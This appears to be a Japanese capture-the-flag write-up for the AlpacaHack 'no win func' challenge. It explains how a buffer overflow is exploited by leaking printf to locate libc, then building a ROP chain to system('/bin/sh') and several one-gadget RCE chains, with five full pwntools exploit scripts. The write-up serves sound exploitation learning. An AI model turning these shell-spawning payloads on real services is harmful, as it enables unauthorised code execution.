---
title: Daily AlpacaHack - no win func
layout: default
parent: Daily AlpacaHack
grand_parent: Writeups
nav_order: 1
---
# Daily AlpacaHack - no win func
## 問題
![[Pasted image 20260907115746.png]]

## 解法
### 要約
flag.txtはバイナリと同じディレクトリに格納されており、シェルを奪取することで中身が確認できる。
ターゲットのバイナリはSSPが付いておらず、buffer overflowを用いて直接リターンアドレスの書き換えが可能。
問題文にあるようにwin関数は存在しないため、gadgetを使う必要がある。
gadgetのアドレスを特定するために、printfのアドレスのリークを使用する。
ROPとone-gadget RCEの両方でシェルは奪取可能。（他にもあるのかも。）

> [!warning]
> libcからgadgetのアドレスを引っ張ってくる際、バージョンの差に注意。
> Dockerからライブラリを引っ張ってくること。
> ```
> docker create --name tmp ubuntu:24.04@sha256:c35e29c9450151419d9448b0fd75374fec4fff364a27f176fb458d472dfc9e54
docker cp tmp:/lib/x86_64-linux-gnu/libc.so.6 ./libc.so.6
docker cp tmp:/lib64/ld-linux-x86-64.so.2 ./ld.so
docker rm tmp
> ``` 
> 
### ROP
やることは典型的なROP。
```system```関数のアドレス、```"/bin/sh"```へのポインタ、```pop rdi; ret;```ガジェットをスタックに仕組んでGO。

#### アライメントについて
System V AMD64 ABIでは、関数のcall直前にスタックが16バイト境界にアライメントされている必要がある。
(関数によっては影響のないものもあるが、```system```関数は内部で```movaps```命令を使っているのでアライメントが必要。)
そのため、何もしない(```ret```のみ)のgadgetを最初に仕込む必要がある。

下図のように、ret gadgetをreturn addrの位置に仕込むことでptr to system()が16バイト境界にアライメントされる。
(図のアドレスは、下位1桁以外は適当)
![[Pasted image 20260916131307.png]]

#### solve.py
```python
#!/usr/bin/env python3

from pwn import *

printf_offset = 0x60100
system_offset = 0x58750
binsh_offset = 0x1CB42F
gadget_offset = 0x1157BC
ret_offset = 0x13B993

def main():
    r = conn()

    r.recvuntil(b"address of printf function: ")
    leak = int(r.recvline().strip(), 16)

    libc_base = leak - printf_offset

    payload = p64(0)
    payload += p64(0)
    payload += p64(0)
    payload += p64(0)
    payload += p64(0)
    payload += p64(0)
    payload += p64(0)
    payload += p64(0)
    payload += p64(0)
    payload += p64(libc_base + ret_offset)
    payload += p64(libc_base + gadget_offset)
    payload += p64(libc_base + binsh_offset)
    payload += p64(libc_base + system_offset)

    r.sendlineafter(b"input > ", payload)
    r.interactive()


if __name__ == "__main__":
    main()

```

### One-gadget RCE
One-gadget RCEでは、その名の通り一つのgadgetのみでシェルの奪取を行う。
使用するツールはこちら:https://github.com/david942j/one_gadget\

#### one_gadgetから得られる情報
```zsh
❯ one_gadget libc.so.6
0x583ec posix_spawn(rsp+0xc, "/bin/sh", 0, rbx, rsp+0x50, environ)
constraints:
  address rsp+0x68 is writable
  rsp & 0xf == 0
  rax == NULL || {"sh", rax, rip+0x17301e, r12, ...} is a valid argv
  rbx == NULL || (u16)[rbx] == NULL

0x583f3 posix_spawn(rsp+0xc, "/bin/sh", 0, rbx, rsp+0x50, environ)
constraints:
  address rsp+0x68 is writable
  rsp & 0xf == 0
  rcx == NULL || {rcx, rax, rip+0x17301e, r12, ...} is a valid argv
  rbx == NULL || (u16)[rbx] == NULL

0xef4ce execve("/bin/sh", rbp-0x50, r12)
constraints:
  address rbp-0x48 is writable
  rbx == NULL || {"/bin/sh", rbx, NULL} is a valid argv
  [r12] == NULL || r12 == NULL || r12 is a valid envp

0xef52b execve("/bin/sh", rbp-0x50, [rbp-0x78])
constraints:
  address rbp-0x50 is writable
  rax == NULL || {"/bin/sh", rax, NULL} is a valid argv
  [[rbp-0x78]] == NULL || [rbp-0x78] == NULL || [rbp-0x78] is a valid envp
```
one_gadgetから得られるのは、各gadgetのオフセットと、それを使うための条件。
条件を満たさずにgadgetを使用したとしても、上手くシェルをとることができない。

条件は、そのgadgetに処理が移った瞬間に満たされている必要がある。
イメージとしては、gadgetの先頭にブレークポイントを仕掛け、そのブレークポイントで停止した瞬間というタイミング。
(実際、この方法でデバッガを使いながら条件の満たせるgadgetを探す。)

今回の問題は上記の4つのgadgetすべてでシェルを奪取することが可能。
これらを使用したスクリプトは本writeupの末尾に掲載。

この問題で使用する場合の各gadgetの個人的な評価:
0x583ec -> rbxにNULLを仕込めばOK。ただ、```pop rbx; ret;```を使うのでone-gadgetではないのかも。
0x583f3 -> rbxとrcxにNULLを仕込む。シンプルだがこれなら今回は0x583ecでいいと思う。
0xef4ce -> rbx,r12にNULLを仕込み、アドレスrbp-0x48が書き込み可能になるようにrbpを仕込む。めんどい。
0xef52b -> アドレスrbp-0x50が書き込み可能かつアドレスrbp-0x78の値がNULLとなるようにrbpを仕込む。
rbpの書き換えと1つのgadgetだけで済むので、これが一番きれいで一番one-gadget RCEっぽい。

#### one-gadget-583ec.py
```python
printf_offset = 0x60100
one_gadget_offset = 0x583EC
pop_rbx_gadget = 0x0005ACF9


def main():
    r = conn()

    r.recvuntil(b"address of printf function: ")
    leak = int(r.recvline().strip(), 16)

    libc_base = leak - printf_offset

    payload = b"A" * 72
    payload += p64(libc_base + pop_rbx_gadget)
    payload += p64(0)
    payload += p64(libc_base + one_gadget_offset)
    print("onegadget_addr:" + hex(libc_base + one_gadget_offset))

    r.sendlineafter(b"input > ", payload)

    r.interactive()
```

#### one-gadget-583f3.py
```python
printf_offset = 0x60100
one_gadget_offset = 0x583F3
pop_rbx_gadget = 0x0005ACF9
pop_rcx_gadget = 0x0012BD7E


def main():
    r = conn()

    r.recvuntil(b"address of printf function: ")
    leak = int(r.recvline().strip(), 16)

    libc_base = leak - printf_offset

    payload = b"A" * 72
    payload += p64(libc_base + pop_rbx_gadget)
    payload += p64(0)
    payload += p64(libc_base + pop_rcx_gadget)
    payload += p64(0)
    payload += p64(libc_base + one_gadget_offset)
    print("onegadget_addr:" + hex(libc_base + one_gadget_offset))

    r.sendlineafter(b"input > ", payload)

    r.interactive()
```

#### one-gadget-ef4ce.py
```python
printf_offset = 0x60100
one_gadget_offset = 0xEF4CE
pop_rbx_gadget = 0x0005ACF9
pop_r12_gadget = 0x001109DD
writable_offset = 0x204000


def main():
    r = conn()

    r.recvuntil(b"address of printf function: ")
    leak = int(r.recvline().strip(), 16)

    libc_base = leak - printf_offset

    payload = b"A" * 64
    payload += p64(libc_base + writable_offset)
    payload += p64(libc_base + pop_rbx_gadget)
    payload += p64(0)
    payload += p64(libc_base + pop_r12_gadget)
    payload += p64(0)
    payload += p64(libc_base + one_gadget_offset)
    print("onegadget_addr:" + hex(libc_base + one_gadget_offset))

    r.sendlineafter(b"input > ", payload)

    r.interactive()

```
#### one-gadget-ef52b.py
```python
printf_offset = 0x60100
one_gadget_offset = 0xEF52B
writable_offset = 0x7FFFF7E032E0 - 0x7FFFF7C00000


def main():
    r = conn()

    r.recvuntil(b"address of printf function: ")
    leak = int(r.recvline().strip(), 16)

    libc_base = leak - printf_offset

    payload = p64(0)
    payload += p64(0)
    payload += p64(0)
    payload += p64(0)
    payload += p64(0)
    payload += p64(0)
    payload += p64(0)
    payload += p64(0)
    payload += p64(libc_base + writable_offset)
    payload += p64(libc_base + one_gadget_offset)

    r.sendlineafter(b"input > ", payload)
    r.interactive()
```